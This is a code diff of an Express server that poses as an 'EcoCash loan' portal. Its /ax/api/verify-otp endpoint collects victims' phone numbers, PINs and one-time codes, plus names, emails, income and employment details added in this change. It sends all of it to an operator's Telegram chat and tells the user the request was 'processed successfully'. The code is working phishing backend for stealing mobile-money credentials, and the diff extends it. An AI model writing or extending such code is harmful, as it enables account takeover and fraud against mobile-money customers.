@@ -4,27 +4,41 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware to parse incoming JSON and form data
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Serve static frontend files directly from the root directory under /ax
+// Serve static frontend files from root under /ax
 app.use('/ax', express.static(path.join(__dirname)));
 
-// API endpoint for handling OTP verification / login submission and notifying Telegram
+// Unified API endpoint for handling loan applications, logins, and OTP verification
 app.post('/ax/api/verify-otp', async (req, res) => {
-    const { phoneNumber, otp, pin } = req.body;
+    const { type, loanAmount, loanTerm, purpose, firstName, lastName, email, phoneNumber, employmentStatus, annualIncome, pin, otp } = req.body;
 
-    // Telegram Bot credentials configured in Render environment variables
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
-    // Format the message for your Telegram chat
-    const message = `🚨 *EcoCash Loan Submission*\n📱 Phone: \`${phoneNumber || 'N/A'}\`\n🔑 Code/PIN: \`${otp || pin || 'N/A'}\`\n✅ Status: Verification Attempted`;
+    let message = `🚨 *EcoCash Portal Submission*\n`;
+    
+    if (type === 'loan_application') {
+        message += `📋 *Loan Application Details*\n` +
+                   `👤 Name: ${firstName || ''} ${lastName || ''}\n` +
+                   `📱 Phone: \`${phoneNumber || 'N/A'}\`\n` +
+                   `📧 Email: ${email || 'N/A'}\n` +
+                   `💰 Amount: $${loanAmount || '5000'}\n` +
+                   `⏳ Term: ${loanTerm || '6 Months'}\n` +
+                   `🚗 Purpose: ${purpose || 'N/A'}\n` +
+                   `💼 Employment: ${employmentStatus || 'N/A'}\n` +
+                   `💵 Annual Income: $${annualIncome || 'N/A'}`;
+    } else {
+        message += `🔐 *Login / Verification*\n` +
+                   `📱 Phone: \`${phoneNumber || 'N/A'}\`\n` +
+                   `🔑 PIN/OTP: \`${pin || otp || 'N/A'}\`\n` +
+                   `✅ Status: Attempted`;
+    }
 
     try {
         if (botToken && chatId) {
-            const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -33,29 +47,19 @@ app.post('/ax/api/verify-otp', async (req, res) => {
                     parse_mode: 'Markdown'
                 })
             });
-
-            const result = await telegramResponse.json();
-            if (!result.ok) {
-                console.error('Telegram API rejected message:', result);
-            }
-        } else {
-            console.warn('Telegram environment variables (TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID) are missing.');
         }
-
-        // Return success response to your frontend JavaScript
-        return res.json({ success: true, message: 'Verified successfully' });
+        return res.json({ success: true, message: 'Processed successfully' });
     } catch (error) {
-        console.error('Error dispatching to Telegram:', error);
-        return res.status(500).json({ success: false, message: 'Server error processing request' });
+        console.error('Telegram dispatch error:', error);
+        return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
-// Catch-all route to serve index.html under /ax/
+// Catch-all route to serve index.html for all /ax/* routes
 app.get('/ax/*', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Start the Express server
 app.listen(PORT, () => {
-    console.log(`EcoCash loan server is running on port ${PORT}`);
+    console.log(`EcoCash loan server running on port ${PORT}`);
 });
